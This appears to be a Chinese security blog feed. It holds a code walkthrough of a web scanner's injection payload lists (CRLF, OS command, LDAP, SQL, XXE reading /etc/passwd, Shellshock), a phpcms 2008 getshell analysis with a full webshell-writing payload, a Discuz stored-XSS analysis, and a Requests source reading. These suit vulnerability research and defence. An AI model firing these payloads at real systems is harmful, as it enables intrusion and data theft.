lib/db/errors/xpath.json：12345678910111213141516171819202122232425262728293031323334&#123; "info":&#123; "name":"XPath", "regexp":[ "::xpath()", "XPATH syntax error\:", "XPathException", "XPath\:", "XPath\(\)", "System.Xml.XPath.XPathException\:", "MS\.Internal\.Xml\.", "Unknown error in XPath", "org.apache.xpath.XPath", "A closing bracket expected in", "An operand in Union Expression does not produce a node-set", "Cannot convert expression to a number", "Document Axis does not allow any context Location Steps", "Empty Path Expression", "Empty Relative Location Path", "Empty Union Expression", "Expected \'\)\' in", "Expected node test or name specification after axis operator", "Incompatible XPath key", "Incorrect Variable Binding", "libxml2 library function failed", "xmlsec library function", "error \'80004005\'", "A document must contain exactly one root element\.", "Expected token \']\'", "\&lt;p\&gt;msxml4.dll\&lt;\/font\&gt;", "4005 Notes error: Query is not understandable" ] &#125;&#125; plugins/attacks/crlf.pypayload中注入的模式是Set-Cookie:crlf=injection，在进行检测时把=injection替换成随机字符串。然后在返回头的Set-Cookie(若有)中检测注入的随机字符串。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768class crlf(Request): """ Carriage Return Line Feed """ get = "GET" post = "POST" def __init__(self,kwargs,url,data): Request.__init__(self,kwargs) self.url = url self.data = data def run(self): """ Run """ info('Checking CRLF Injection...') URL = None DATA = None PAYLOAD = None # start for payload in crlfp(): random_string = r_string(20) payload = payload.replace('=injection',random_string) # check host req = self.Send(CPath(self.url,'/%s'%payload),method=self.get) if 'Set-Cookie' in req.headers.keys(): if search(random_string,req.headers['Set-Cookie'],I): plus('A potential \"Carriage Return Line Feed\" was found at: ') more('URL: &#123;&#125;'.format(req.url)) more('PAYLOAD: &#123;&#125;'.format(payload)) break # post method if self.data: # data add payload addPayload = preplace(self.url,payload,self.data) for data in addPayload.run(): # send request req = self.Send(url=self.url,method=self.post,data=data) # search payload in response content if 'Set-Cookie' in req.headers.keys(): if search(random_string,req.headers['Set-Cookie'],I): URL = req.url DATA = data PAYLOAD = payload break # get method else: # url and payload urls = preplace(self.url,payload,None) for url in urls.run(): # send request req = self.Send(url=url,method=self.get) # search payload in response content if 'Set-Cookie' in req.headers.keys(): if search(random_string,req.headers['Set-Cookie'],I): URL = url PAYLOAD = payload break # break if URL and PAYLOAD not empty if URL and PAYLOAD: # print if DATA != None: plus("A potential \"Carriage Return Line Feed\" was found at:") more("URL: &#123;&#125;".format(URL)) more("POST DATA: &#123;&#125;".format(DATA)) more("PAYLOAD: &#123;&#125;".format(PAYLOAD)) elif DATA == None: plus("A potential \"Carriage Return Line Feed\" was found at:") more("URL: &#123;&#125;".format(URL)) more("PAYLOAD: &#123;&#125;".format(PAYLOAD)) # break break 对应payload 在 lib/utils/payload.py:21：1234567891011def crlfp(): """Carriage Return Line Feed""" payload = [r'%%0a0aSet-Cookie:crlf=injection'] payload += [r'%0aSet-Cookie:crlf=injection'] payload += [r'%0d%0aSet-Cookie:crlf=injection'] payload += [r'%0dSet-Cookie:crlf=injection'] payload += [r'%23%0d%0aSet-Cookie:crlf=injection'] payload += [r'%25%30%61Set-Cookie:crlf=injection'] payload += [r'%2e%2e%2f%0d%0aSet-Cookie:crlf=injection'] payload += [r'%2f%2e%2e%0d%0aSet-Cookie:crlf=injection'] return payload plugins/attacks/oscommand.py代码结构与 htmli.py 类似。根据payload，直接在响应中去匹配特殊字符if search(&#39;{}&#39;.format(payload.split(&#39;&quot;&#39;)[1]),req.content): 。 对应payload在 lib/utils/payload.py:124123456789101112def os(): """ OS Command Injection """ payload = ["%secho \"%s\""%(quote_plus("&amp;"),r_string(30))] payload += ["%secho \"%s\""%(quote_plus("&amp;&amp;"),r_string(30))] payload += ["%secho \"%s\""%(quote_plus("|"),r_string(30))] payload += ["%secho \"%s\""%(quote_plus(";"),r_string(30))] payload += ["%secho \"%s\""%(quote_plus("||"),r_string(30))] payload += ["\techo \"%s\""%(r_string(30))] payload += ["\t\techo \"%s\""%(r_string(30))] payload += ["%s\"/bin/cat /etc/passwd\""%quote_plus('|')] payload += ["%s\"/etc/passwd\""%quote_plus('|')] return payload plugins/attacks/ldapi.py代码结构与 bufferoverflow.py 类似。 payload 在 lib/utils/payload.py:197：12345678910111213141516def ldap(): """ LDAP Injection """ payload = ["!"] payload += ["%29"] payload += ["%21"] payload += ["%28"] payload += ["%26"] payload += ["("] payload += [")"] payload += ["@\'"] payload += ["*()|&amp;'"] payload += ["%s*"%r_string(10)] payload += ["*(|(%s=*))"%r_string(10)] payload += ["%s*)((|%s=*)"%(r_string(10),r_string(10))] payload += [r"%2A%28%7C%28"+r_string(10)+r"%3D%2A%29%29"] return payload 用于匹配的模式在 lib/db/errors/xpath.json：1234567891011121314151617&#123; "info":&#123; "name":"LDAP", "regexp":[ "supplied argument is not a valid ldap", "javax\.naming\.NameNotFoundException", "javax\.naming\.directory\.InvalidSearchFilterException", "Invalid DN syntax", "LDAPException*", "Module Products\.LDAPMultiPlugins", "IPWorksASP\.LDAP", "Local error occurred", "Object does not exist", "An inappropriate matching occurred" ] &#125;&#125; plugins/attacks/headerxss.py检查存在于头部字段的XSS，包括cookie字段，referer字段，useragent字段。其实就是拿xss的payload放在对应的位置再打一圈。话说这个位置的xss危害不大吧。。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253class headerxss(Request): """ Cross-Site Scripting (XSS) in headers value """ get = "GET" def __init__(self,kwargs,url,data): Request.__init__(self,kwargs) self.url = url self.data = data def run(self): """Run""" info('Checking XSS on Headers..') self.cookie() self.referer() self.useragent() def cookie(self): """ Check cookie """ for payload in pxss(): headers = &#123; 'Cookie':'&#123;&#125;'.format(payload) &#125; req = self.Send(url=self.url,method=self.get,headers=headers) # search payload in content if search(payload,req.content): plus("A potential \"Cross-Site Scripting (XSS)\" was found at cookie header value:") more("URL: &#123;&#125;".format(req.url)) more("PAYLOAD: &#123;&#125;".format(payload)) def referer(self): """ Check referer """ for payload in pxss(): headers = &#123; 'Referer':'&#123;&#125;'.format(payload) &#125; req = self.Send(url=self.url,method=self.get,headers=headers) # search payload in content if search(payload,req.content): plus("A potential \"Cross-Site Scripting (XSS)\" was found at referer header value:") more("URL: &#123;&#125;".format(req.url)) more("PAYLOAD: &#123;&#125;".format(payload)) def useragent(self): """ Check user-agent """ for payload in pxss(): headers = &#123; 'User-Agent':'&#123;&#125;'.format(payload) &#125; req = self.Send(url=self.url,method=self.get,headers=headers) # search payload in content if search(payload,req.content): plus("A potential \"Cross-Site Scripting (XSS)\" was found at user-agent header value:") more("URL: &#123;&#125;".format(req.url)) more("PAYLOAD: &#123;&#125;".format(payload)) plugins/attacks/sqli.py代码结构与 bufferoverflow.py 类似。 payload 在 lib/utils/payload.py:101：12345678910111213141516171819202122def sql(): """Generic SQL""" payload = ["\'"] payload += ["\\\'"] payload += ["||\'"] payload += ["1\'1"] payload += ["-%s"%(r_time())] payload += ["\'%s"%(r_time())] payload += ["%s\'"%(r_string(10))] payload += ["\\\"%s"%(r_string(10))] payload += ["%s=\'%s"%(r_time(),r_time())] payload += ["))\'+OR+%s=%s"%(r_time(),r_time())] payload += ["))) AND %s=%s"%(r_time(),r_time())] payload += ["; OR \'%s\'=\'%s\'"%(r_time(),r_time())] payload += ["\'OR \'))%s=%s --"%(r_time(),r_time())] payload += ["\'AND \')))%s=%s --#"%(r_time(),r_time())] payload += [" %s 1=1 --"%(r_string(20))] payload += [" or sleep(%s)=\'"%(r_time())] payload += ["%s' AND userid IS NULL; --"%(r_string(10))] payload += ["\") or pg_sleep(%s)--"%(r_time())] payload += ["; exec (\'sel\' + \'ect us\' + \'er\')"] return payload 用于匹配的模式在 lib/db/sqldberror/ 下。略过不提。 plugins/attacks/xxe.py代码结构与 htmli.py 类似。发送请求，然后匹配if search(payload,req.content):。个人看法，匹配效果较差。 payload在 lib/utils/payload.py:33:123456789def xxep(): """ XML External Entity""" payload = ['&lt;!DOCTYPE foo [&lt;!ENTITY xxe7eb97 SYSTEM "file:///etc/passwd"&gt; ]&gt;'] payload += ['&lt;!DOCTYPE foo [&lt;!ENTITY xxe7eb97 SYSTEM "file:///c:/boot.ini"&gt; ]&gt;'] payload += ['&lt;!DOCTYPE foo [&lt;!ENTITY xxe46471 SYSTEM "file:///etc/passwd"&gt; ]&gt;'] payload += ['&lt;!DOCTYPE foo [&lt;!ENTITY xxe46471 SYSTEM "file:///c:/boot.ini"&gt; ]&gt;'] payload += ['&lt;?xml version="1.0"?&gt;&lt;change-log&gt;&lt;text&gt;root:/bin/bash&lt;/text&gt;&lt;/change-log&gt;'] payload += ['&lt;?xml version="1.0"?&gt;&lt;change-log&gt;&lt;text&gt;default=multi(0)disk(0)rdisk(0)partition(1)&lt;/text&gt;&lt;/change-log&gt;'] return payload plugins/attacks/bashi.pybash注入，但是这里只检测了GET方法，POST请求并不检查！另外这里在 头部的User-Agent、Referer字段插入了payload。 1234567891011121314151617181920212223242526class bashi(Request): """Bash Command Injection (ShellShock)""" get = "GET" def __init__(self,kwargs,url,data): Request.__init__(self,kwargs) self.url = url self.data = data def run(self): """Run""" info('Checking Bash Command Injection...') for payload in bash(): # user-agent and referer header add the payload user_agent = &#123;'User-Agent':'() &#123; :;&#125;; echo; echo; %s;'%payload, 'Referer':'() &#123; :;&#125;; echo; echo; %s;'%payload &#125; # send request req = self.Send(url=self.url,method=self.get,headers=user_agent) # split payload if '\"' in payload: payload = payload.split('"')[1] # search root:/bin/ba[sh] or payload in content if search(r"root:/bin/[bash|sh]|"+payload,req.content): plus("A potential \"Bash Command Injection\" was found via HTTP User-Agent header (ShellShock)") more("URL: &#123;&#125;".format(self.url)) more("PAYLOAD: &#123;&#125;".format('() &#123; :;&#125;; echo; echo; %s;'%(payload))) break payload定义在：12345678910def bash(): """Basic Bash Command Injection """ payload = ["/bin/cat /etc/passwd"] payload += ["/etc/passwd"] payload += ["/et*/passw?"] payload += ["/ca?/bi? /et?/passw?"] payload += ["/et*/pa??wd"] payload += ["cat /etc/passwd"] payload += ["/bi*/echo \"%s\""%(r_string(10))] return payload 先休息一下。。 plugins/attacks/blindsqli.pyplugins/attacks/headersqli.pyplugins/auditplugins/audit/apache.pyplugins/audit/phpinfo.pyplugins/audit/xst.pyplugins/audit/robots.pyplugins/audit/open_redirect.pyplugins/bruteplugins/brute/params.pyplugins/brute/backupfile.pyplugins/brute/backupdir.pyplugins/brute/adminpanel.pyplugins/brute/backdoor.pyplugins/brute/commondir.pyplugins/brute/commonfile.pyplugins/disclosureplugins/disclosure/errors.pyplugins/disclosure/creditcards.pyplugins/disclosure/emails.pyplugins/disclosure/privateip.pyplugins/disclosure/ssn.pyplugins/fingerprintcmsplugins/fingerprint/cms/plone.pyplugins/fingerprint/cms/wordpress.pyplugins/fingerprint/cms/silverstripe.pyplugins/fingerprint/cms/adobeaem.pyplugins/fingerprint/cms/joomla.pyplugins/fingerprint/cms/drupal.pyplugins/fingerprint/cms/magento.pyframeworkplugins/fingerprint/framework/symfony.pyplugins/fingerprint/framework/cherrypy.pyplugins/fingerprint/framework/seagull.pyplugins/fingerprint/framework/horde.pyplugins/fingerprint/framework/cakephp.pyplugins/fingerprint/framework/zend.pyplugins/fingerprint/framework/play.pyplugins/fingerprint/framework/phalcon.pyplugins/fingerprint/framework/nette.pyplugins/fingerprint/framework/spring.pyplugins/fingerprint/framework/karrigell.pyplugins/fingerprint/framework/grails.pyplugins/fingerprint/framework/web2py.pyplugins/fingerprint/framework/flask.pyplugins/fingerprint/framework/yii.pyplugins/fingerprint/framework/codeigniter.pyplugins/fingerprint/framework/fuelphp.pyplugins/fingerprint/framework/larvel.pyplugins/fingerprint/framework/asp_mvc.pyplugins/fingerprint/framework/apachejackrabbit.pyplugins/fingerprint/framework/django.pyplugins/fingerprint/framework/rails.pyplugins/fingerprint/framework/dancer.pyheaderplugins/fingerprint/header/header.pyplugins/fingerprint/header/cookies.pylanguageplugins/fingerprint/language/aspnet.pyplugins/fingerprint/language/perl.pyplugins/fingerprint/language/java.pyplugins/fingerprint/language/coldfusion.pyplugins/fingerprint/language/python.pyplugins/fingerprint/language/flash.pyplugins/fingerprint/language/php.pyplugins/fingerprint/language/ruby.pyplugins/fingerprint/language/asp.pyosplugins/fingerprint/os/unix.pyplugins/fingerprint/os/ibm.pyplugins/fingerprint/os/linux.pyplugins/fingerprint/os/solaris.pyplugins/fingerprint/os/bsd.pyplugins/fingerprint/os/mac.pyplugins/fingerprint/os/windows.pyserverplugins/fingerprint/server/server.pywafplugins/fingerprint/waf/yundun.pyplugins/fingerprint/waf/urlscan.pyplugins/fingerprint/waf/datapower.pyplugins/fingerprint/waf/sucuri.pyplugins/fingerprint/waf/aws.pyplugins/fingerprint/waf/senginx.pyplugins/fingerprint/waf/baidu.pyplugins/fingerprint/waf/safe3.pyplugins/fingerprint/waf/secureiis.pyplugins/fingerprint/waf/anquanbao.pyplugins/fingerprint/waf/teros.pyplugins/fingerprint/waf/sitelock.pyplugins/fingerprint/waf/netcontinuum.pyplugins/fingerprint/waf/cloudflare.pyplugins/fingerprint/waf/nsfocus.pyplugins/fingerprint/waf/airlock.pyplugins/fingerprint/waf/stingray.pyplugins/fingerprint/waf/safedog.pyplugins/fingerprint/waf/profense.pyplugins/fingerprint/waf/comodo.pyplugins/fingerprint/waf/modsecurity.pyplugins/fingerprint/waf/blockdos.pyplugins/fingerprint/waf/hyperguard.pyplugins/fingerprint/waf/sophos.pyplugins/fingerprint/waf/requestvalidationmode.pyplugins/fingerprint/waf/cloudfront.pyplugins/fingerprint/waf/netscaler.pyplugins/fingerprint/waf/uspses.pyplugins/fingerprint/waf/binarysec.pyplugins/fingerprint/waf/paloalto.pyplugins/fingerprint/waf/wallarm.pyplugins/fingerprint/waf/incapsula.pyplugins/fingerprint/waf/knownsec.pyplugins/fingerprint/waf/jiasule.pyplugins/fingerprint/waf/edgecast.pyplugins/fingerprint/waf/varnish.pyplugins/fingerprint/waf/dotdefender.pyplugins/fingerprint/waf/newdefend.pyplugins/fingerprint/waf/isaserver.pyplugins/fingerprint/waf/kona.pyplugins/fingerprint/waf/asm.pyplugins/fingerprint/waf/fortiweb.pyplugins/fingerprint/waf/yunsuo.pyplugins/fingerprint/waf/trafficshield.pyplugins/fingerprint/waf/sonicwall.pyplugins/fingerprint/waf/barracuda.pyplugins/fingerprint/waf/bigip.pyplugins/fingerprint/waf/ciscoacexml.pyplugins/fingerprint/waf/betterwpsecurity.pyplugins/fingerprint/waf/denyall.pyplugins/fingerprint/waf/radware.pyplugins/fingerprint/waf/expressionengine.pyplugins/fingerprint/waf/armor.pyplugins/fingerprint/waf/webknight.py]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[phpcms 2008 type.php 前台代码注入getshell漏洞分析]]></title>
      <url>%2F2018%2F11%2F29%2Fphpcms-2008-type-php-%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[phpcms 2008 type.php 前台代码注入getshell漏洞分析 tpye.php中:12345678&lt;?phprequire dirname(__FILE__).'/include/common.inc.php';...if(empty($template)) $template = 'type';...include template('phpcms', $template);...?&gt; 先看一下require进来的include/common.inc.php，在这个文件第58行中存在如下代码：1234567891011121314151617181920if($_REQUEST)&#123; if(MAGIC_QUOTES_GPC) &#123; $_REQUEST = new_stripslashes($_REQUEST); if($_COOKIE) $_COOKIE = new_stripslashes($_COOKIE); extract($db-&gt;escape($_REQUEST), EXTR_SKIP); &#125; else &#123; $_POST = $db-&gt;escape($_POST); $_GET = $db-&gt;escape($_GET); $_COOKIE = $db-&gt;escape($_COOKIE); @extract($_POST,EXTR_SKIP); @extract($_GET,EXTR_SKIP); @extract($_COOKIE,EXTR_SKIP); &#125; if(!defined('IN_ADMIN')) $_REQUEST = filter_xss($_REQUEST, ALLOWED_HTMLTAGS); if($_COOKIE) $db-&gt;escape($_COOKIE);&#125; 上面这段代码会通过@extract()将尚未注册的变量进行注册，如果有冲突，不覆盖已有的变量。因此通过这个伪全局可以绕过if(empty($template)) $template = &#39;type&#39;;这句话的指定，即$template变量可控。 跟入template函数，定义在 include/global.func.php:7721234567891011function template($module = 'phpcms', $template = 'index', $istag = 0)&#123; $compiledtplfile = TPL_CACHEPATH.$module.'_'.$template.'.tpl.php'; if(TPL_REFRESH &amp;&amp; (!file_exists($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.'/'.$module.'/'.$template.'.html') &gt; @filemtime($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.'/tag.inc.php') &gt; @filemtime($compiledtplfile))) &#123; require_once PHPCMS_ROOT.'include/template.func.php'; template_compile($module, $template, $istag); &#125; return $compiledtplfile;&#125; 这里会进行一些判断，TPL_REFRESH表示是否开启模板缓存自动刷新，默认为1, 剩下的用于判断缓存超时。倘若需要更新缓存则进入了template_compile()函数，根据上一句的require_once可知定义在 include/template.func.php:2 12345678910111213&lt;?phpfunction template_compile($module, $template, $istag = 0)&#123; $tplfile = TPL_ROOT.TPL_NAME.'/'.$module.'/'.$template.'.html'; $content = @file_get_contents($tplfile); if($content === false) showmessage("$tplfile is not exists!"); $compiledtplfile = TPL_CACHEPATH.$module.'_'.$template.'.tpl.php'; $content = ($istag || substr($template, 0, 4) == 'tag_') ? '&lt;?php function _tag_'.$module.'_'.$template.'($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'.template_parse($content, 1).'&lt;?php &#125; ?&gt;' : template_parse($content); $strlen = file_put_contents($compiledtplfile, $content); @chmod($compiledtplfile, 0777); return $strlen;&#125; 重点看$content = ($istag || substr($template, 0, 4) == &#39;tag_&#39;)这一句。由于$template可控，只要$template以tag_开头，就可以使得此处的三元表达式进入到第一个分支中，即相当于：1$content = '&lt;?php function _tag_'.$module.'_'.$template.'($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'.template_parse($content, 1).'&lt;?php &#125; ?&gt;' 由于$template未经过滤，被直接拼接到内容中，所以如果指定tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss ，则拼接后的结果为1$content = '&lt;?php function _tag_phpcms_tag_()&#123;&#125;;@unlink(_FILE_);assert($_GET[1]);&#123;//../rss($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'.template_parse($content, 1).'&lt;?php &#125; ?&gt;' 可以看到一句话木马已经写入了$content，之后file_put_contents($compiledtplfile, $content);将内容写入文件。 回到前面的template_compile函数中，TPL_CACHEPATH为常量PHPCMS_ROOT.&#39;data/cache_template/; 可知 $compiledtplfile 为：123456$compiledtplfile = TPL_CACHEPATH.$module.'_'.$template.'.tpl.php';```4即：```php$compiledtplfile = 'data/cache_template/phpcms_tag_()&#123;&#125;;@unlink(_FILE_);assert($_GET[1]);&#123;//../rss.tpl.php'; 所以payload末尾的../利用目录穿越使得最后的$compiledtplfile为&#39;data/cache_template/rss.tpl.php 为了解析不出错，payload末尾处的//注释了拼接后的其余部分，如上图。 此后访问 http://127.0.0.1/phpcms/data/cache_template/rss.tpl.php?1=phpinfo()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Discuz v3.4 排行页面存储型XSS漏洞分析]]></title>
      <url>%2F2018%2F10%2F15%2FDiscuz-v3-4-%E6%8E%92%E8%A1%8C%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[2018年10月12日，Discuz官方修复了一处XSS漏洞： 简要分析source/module/misc/misc_ranklist.php:1661234567891011121314&lt;?php function getranklist_members($offset = 0, $limit = 20) &#123; require_once libfile('function/forum'); $members = array(); $topusers = C::t('home_show')-&gt;fetch_all_by_unitprice($offset, $limit, true); foreach($topusers as $member) &#123; $member['avatar'] = avatar($member['uid'], 'small'); $member['note'] = dhtmlspecialchars($member['note']); $members[] = $member; &#125; return $members;&#125; Dz在此处获取到$member[&#39;note&#39;]后调用了dhtmlspecialchars进行过滤，在source/function/function_core.php:203 会对’&amp;’, ‘“‘, ‘&lt;’, ‘&gt;’进行实体编码。1234567891011121314&lt;?php function dhtmlspecialchars($string, $flags = null) &#123; if(is_array($string)) &#123; 。。。 &#125; else &#123; if($flags === null) &#123; $string = str_replace(array('&amp;', '"', '&lt;', '&gt;'), array('&amp;amp;', '&amp;quot;', '&amp;lt;', '&amp;gt;'), $string); &#125; else &#123; 。。。 &#125; return $string;&#125; 从getranklist_members返回后 source/include/misc/misc_ranklist_index.php:1131234567&lt;?php 。。。if($ranklist_setting['member']['available']) &#123; $memberlist = getranklist_members(0, 27);&#125;。。。include template('diy:ranklist/ranklist'); 进行模板的渲染在 data/template/1_diy_ranklist_ranklist.tpl.php:32123&lt;?php if($memberlist) &#123; ?&gt;&lt;a href="home.php?mod=space&amp;amp;uid=&lt;?php echo $memberlist['0']['uid'];?&gt;&amp;amp;do=profile" target="_blank" id="bid_&lt;?php echo $memberlist['0']['uid'];?&gt;" class="hm" &lt;?php if($memberlist['0']['note']) &#123; ?&gt; onmouseover="showTip(trhis)" tip="&lt;?php echo $memberlist['0']['username'];?&gt;: &lt;?php echo $memberlist['0']['note'];?&gt;"&lt;?php &#125; ?&gt;&gt;&lt;?php echo avatar($memberlist[0][uid],middle);?&gt;&lt;/a&gt;&lt;?php &#125; ?&gt; 可以看到在tip属性中输出了$memberlist[&#39;0&#39;][&#39;note&#39;]。在之前有一个onmouseover事件，跟入showTip(trhis) 在 static/js/common.js:1062123function showTip(ctrlobj) &#123; $F('_showTip', arguments);&#125; 跟入_showTip，在 static/js/common_extra.js:91212345678910111213141516function _showTip(ctrlobj) &#123; if(!ctrlobj.id) &#123; ctrlobj.id = 'tip_' + Math.random(); &#125; menuid = ctrlobj.id + '_menu'; if(!$(menuid)) &#123; var div = document.createElement('div'); div.id = ctrlobj.id + '_menu'; div.className = 'tip tip_4'; div.style.display = 'none'; div.innerHTML = '&lt;div class="tip_horn"&gt;&lt;/div&gt;&lt;div class="tip_c"&gt;' + ctrlobj.getAttribute('tip') + '&lt;/div&gt;'; $('append_parent').appendChild(div); &#125; $(ctrlobj.id).onmouseout = function () &#123; hideMenu('', 'prompt'); &#125;; showMenu(&#123;'mtype':'prompt','ctrlid':ctrlobj.id,'pos':'12!','duration':2,'zindex':JSMENU['zIndex']['prompt']&#125;);&#125; 通过ctrlobj.getAttribute(&#39;tip&#39;)获取tip属性的值，由于getAttribute获取的内容会自动反转义，即前面在dhtmlspecialchars编码过的内容又被解码了一次。此后拼接到div标签的innerHTML中，最后输出到页面上造成了xss 关于getAttribute，可以用下面代码测试：12345678&lt;html&gt;&lt;div name="&amp;lt;a&amp;gt;" id="div"&gt;test&lt;/div&gt;&lt;script&gt;div1 = document.getElementById("div");align = div1.getAttribute("name");alert(align); &lt;/script&gt; 漏洞复现该CMS中，排行榜功能是默认开启的。在地址 http://127.0.0.1/misc.php?mod=ranklist&amp;type=member 的上榜宣言中输入payload（拒绝伸手党） 在 http://127.0.0.1/misc.php?mod=ranklist 当鼠标移动到头像上触发onmouseover事件，执行xss 修复方案 多增加一次dhtmlspecialchars。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Requests v0.2.0 源码阅读]]></title>
      <url>%2F2018%2F10%2F13%2FRequests-v0-2-0-%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%2F</url>
      <content type="text"><![CDATA[Requests v0.2.0 源码阅读 v0.2.01git clone https://github.com/requests/requests 从 https://github.com/requests/requests/releases?after=v0.3.0 知道 v0.2.0 发布时的 commit为 https://github.com/requests/requests/commit/d2427ecae751a533ddd9026849dd19cfaa3394f4 。检出。 项目结构 name usage docs 保存文档 requests 保存源代码 .gitignore 略 HISTORY.rst 历史 LICENSE 协议 README.rst readme setup.py 安装 test_requests.py 测试 test_requests.py 定义如上方法，用于进行功能测试。 requests主要关注 core.py UML图： Structure： 主要实现四种类：请求基类_Request、请求类Request、响应类Response、认证AuthObject，七种方法：get、post、put、delete和认证相关的方法，四种异常类。 _Request 类对urllib2.Request对象 的封装，允许对请求方法进行s手动设置。12345678910111213141516171819class _Request(urllib2.Request): """Hidden wrapper around the urllib2.Request object. Allows for manual setting of HTTP methods. """ def __init__(self, url, data=None, headers=&#123;&#125;, origin_req_host=None, unverifiable=False, method=None): urllib2.Request.__init__( self, url, data, headers, origin_req_host, unverifiable) # 设置请求方法 self.method = method # 获取请求方法 def get_method(self): if self.method: return self.method return urllib2.Request.get_method(self) Request 类 附上一些私有变量和私有方法：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667class Request(object): """The :class:`Request` object. It carries out all functionality of Requests. Recommended interface is with the Requests functions. """ _METHODS = ('GET', 'HEAD', 'PUT', 'POST', 'DELETE') # 初始化信息 def __init__(self): self.url = None self.headers = dict() self.method = None self.params = &#123;&#125; self.data = &#123;&#125; self.response = Response() self.auth = None self.sent = False # repr 略过不提 def __repr__(self): try: repr = '&lt;Request [%s]&gt;' % (self.method) except: repr = '&lt;Request object&gt;' return repr # 设置method时，会调用 __setattr__ 方法 # 检查设置的值 是否在规定的方法 _METHODS 列表中 # 若不在，则抛出 InvalidMethod 错误 def __setattr__(self, name, value): if (name == 'method') and (value): if not value in self._METHODS: raise InvalidMethod() object.__setattr__(self, name, value) # 用于检查 url 是否设置 # 若无设置，抛出 URLRequired 错误 def _checks(self): """Deterministic checks for consistiency.""" if not self.url: raise URLRequired # opener对象 def _get_opener(self): """ Creates appropriate opener object for urllib2. """ # 如果需要 认证 if self.auth: # create a password manager authr = urllib2.HTTPPasswordMgrWithDefaultRealm() authr.add_password(None, self.url, self.auth.username, self.auth.password) handler = urllib2.HTTPBasicAuthHandler(authr) opener = urllib2.build_opener(handler) # use the opener to fetch a URL return opener.open else: # 若无需认证 return urllib2.urlopen 。。。 Request类主要用于发送请求，因此重点关注其中的send方法，注释中解释了几点： 发送请求，成功返回True，失败返回False 如果传输过程中出错，则self.response.status_code会包含错误代码 一旦请求成功发送，则Request类的sent属性会变为True anyway参数若被设为True，则请求一定会被发送，不管是否曾发送过， 1234567891011121314151617181920212223242526def send(self, anyway=False): """Sends the request. Returns True of successfull, false if not. If there was an HTTPError during transmission, self.response.status_code will contain the HTTPError code. Once a request is successfully sent, `sent` will equal True. :param anyway: If True, request will be sent, even if it has already been sent. """ self._checks() success = False if self.method in ('GET', 'HEAD', 'DELETE'): # 第一部分 ('GET', 'HEAD', 'DELETE') elif self.method == 'PUT': # 第二部分 PUT elif self.method == 'POST': # 第三部分 POST self.sent = True if success else False return success 在send中，会先进行self._checks()检查：12345def _checks(self): """Deterministic checks for consistiency.""" if not self.url: raise URLRequired 这里只检测了URL是否设置，若没有则抛出URLRequired错误。然后根据method的不同分情况send请求，如果发送成功则success为True，sent变量也为True，然后返回success变量。 ‘GET’, ‘HEAD’, ‘DELETE’添加注释，代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647def send(self, anyway=False): 。。。 if self.method in ('GET', 'HEAD', 'DELETE'): # 若不曾发送过 或者 不管任何情况 if (not self.sent) or anyway: # 如果 params是dict类型的话，进行urlencode # url encode GET params if it's a dict if isinstance(self.params, dict): params = urllib.urlencode(self.params) else: params = self.params # 获取 _Request 对象 # :param ("%s?%s" % (self.url, params)): 组装url # :param method : 请求方法 req = _Request(("%s?%s" % (self.url, params)), method=self.method) # 若有设置 headers if self.headers: req.headers = self.headers # 获取 opener 对象 ， opener = self._get_opener() try: # 发出请求 resp = opener(req) # 状态码 self.response.status_code = resp.code # 头部信息 self.response.headers = resp.info().dict # 由于在这个判断分支中处理 'GET' 'HEAD', 'DELETE'三种请求 # 'HEAD', 'DELETE' 并不是为了获取内容, 他们根据 status_code 即可判断是否请求成功 # 若请求方法是 GET , 则设置返回的响应 if self.method.lower() == 'get': # 设置响应的 content 值 self.response.content = resp.read() # 请求成功,设置 success为 True success = True except urllib2.HTTPError, why: # 请求出错, 设置错误码 self.response.status_code = why.code ‘PUT’添加注释，代码如下：123456789101112131415161718192021222324252627def send(self, anyway=False): 。。。 # 请求方法为 PUT elif self.method == 'PUT': if (not self.sent) or anyway: # url 和 请求方法为PUT req = _Request(self.url, method='PUT') if self.headers: req.headers = self.headers # 设置PUT请求体 req.data = self.data try: opener = self._get_opener() # 发处请求 resp = opener(req) # 设置响应 self.response.status_code = resp.code self.response.headers = resp.info().dict self.response.content = resp.read() success = True except urllib2.HTTPError, why: self.response.status_code = why.code ‘POST’添加注释，代码如下：123456789101112131415161718192021222324252627282930313233343536def send(self, anyway=False): 。。。 # 请求方法为 POST elif self.method == 'POST': if (not self.sent) or anyway # url 和 请求方法为POST req = _Request(self.url, method='POST') # 设置 headers if self.headers: req.headers = self.headers # 如果是dict的话，进行urlencode # url encode form data if it's a dict if isinstance(self.data, dict): req.data = urllib.urlencode(self.data) else: req.data = self.data try: # 获取opener opener = self._get_opener() # 发出请求 resp = opener(req) # 设置响应 self.response.status_code = resp.code self.response.headers = resp.info().dict self.response.content = resp.read() success = True except urllib2.HTTPError, why: self.response.status_code = why.code Response 类在 Request类中我们见到在Request初始化__init__时设置了self.response = Response()。然后根据请求方法的不同，设置状态码self.response.status_code、响应头部self.response.headers、响应内容self.response.content 。接下来就看看response类是如何实现的。 1234567891011121314151617class Response(object): """The :class:`Request` object. All 